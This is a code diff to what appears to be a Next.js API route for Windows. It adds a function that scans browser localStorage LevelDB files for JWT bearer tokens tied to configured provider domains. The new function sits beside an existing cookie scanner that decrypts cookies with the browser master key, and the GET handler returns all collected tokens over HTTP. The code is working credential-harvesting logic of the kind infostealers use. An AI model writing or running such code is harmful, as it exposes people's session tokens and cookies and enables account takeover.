@@ -109,6 +109,38 @@ function scanCookies(cookiePath: string, masterKey: Buffer | null, browser: stri
   }
 }
 
+// ─── localStorage Scanner for JWT tokens ───
+function scanLocalStorage(basePath: string, browser: string, providerDomains: string[], providerName: string): TokenResult[] {
+  try {
+    if (!existsSync(basePath)) return [];
+    const files = readdirSync(basePath).filter(f => f.endsWith(".log") || f.endsWith(".ldb"));
+    const results: TokenResult[] = [];
+    const seen = new Set<string>();
+    const jwtPattern = /eyJ[a-zA-Z0-9_\-\.+\/=]{50,}/g;
+
+    for (const file of files) {
+      try {
+        const content = readFileSync(join(basePath, file), "utf-8");
+        const hasProviderDomain = providerDomains.some(d => {
+          try { return new RegExp(d.replace(/\./g, "\\."), "i").test(content); } catch { return false; }
+        });
+        if (!hasProviderDomain) continue;
+
+        jwtPattern.lastIndex = 0;
+        let m;
+        while ((m = jwtPattern.exec(content)) !== null) {
+          const val = m[0];
+          if (val.length > 50 && !seen.has(val)) {
+            seen.add(val);
+            results.push({ browser, domain: "localStorage", name: "Bearer Token (JWT)", value: val, decrypted: true, source: "localStorage", provider: providerName });
+          }
+        }
+      } catch {}
+    }
+    return results;
+  } catch { return []; }
+}
+
 // ─── GET Handler ───
 export async function GET() {
   if (process.platform !== "win32") return NextResponse.json({ tokens: [], error: "Windows only" });
@@ -126,6 +158,18 @@ export async function GET() {
     console.log(`[Tokens] ${b.name}: masterKey=${!!masterKey}, cookies=${b.cookiePath}`);
     for (const p of providers) {
       allTokens.push(...scanCookies(b.cookiePath, masterKey, b.name, p.domains, p.name));
+      // Also scan localStorage for JWT Bearer tokens
+      const lsPath = join(b.userDataPath, "Default", "Local Storage", "leveldb");
+      if (existsSync(lsPath)) allTokens.push(...scanLocalStorage(lsPath, b.name, p.domains, p.name));
+      else {
+        try {
+          const dirs = readdirSync(b.userDataPath, { withFileTypes: true }).filter(d => d.isDirectory());
+          for (const d of dirs) {
+            const p2 = join(b.userDataPath, d.name, "Local Storage", "leveldb");
+            if (existsSync(p2)) { allTokens.push(...scanLocalStorage(p2, b.name, p.domains, p.name)); break; }
+          }
+        } catch {}
+      }
     }
   }
   const valid = allTokens.filter(t => t.decrypted);
